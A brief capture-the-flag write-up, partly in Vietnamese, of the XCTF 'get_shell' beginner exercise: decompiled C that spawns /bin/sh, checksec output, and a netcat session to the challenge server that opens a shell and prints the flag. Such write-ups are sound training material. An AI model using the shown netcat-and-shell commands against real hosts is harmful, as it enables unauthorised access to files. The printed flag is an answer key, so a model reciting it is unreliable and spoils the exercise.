# XCTF - PWN Exercise - get_shell

```c
#include<stdio.h>

int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("OK,this time we will get a shell.");
  system("/bin/sh");
  return 0;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/6_get_shell λ checksec get_shell      
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/6_get_shell/get_shell'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

Bạn chỉ cần netcat đến server là có shell tương tác đọc flag.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/6_get_shell λ nc 111.200.241.244 63403
ls
bin
dev
flag
get_shell
lib
lib32
lib64
cat flag
cyberpeace{70d813fa83114e6359db33b705d75446}
```
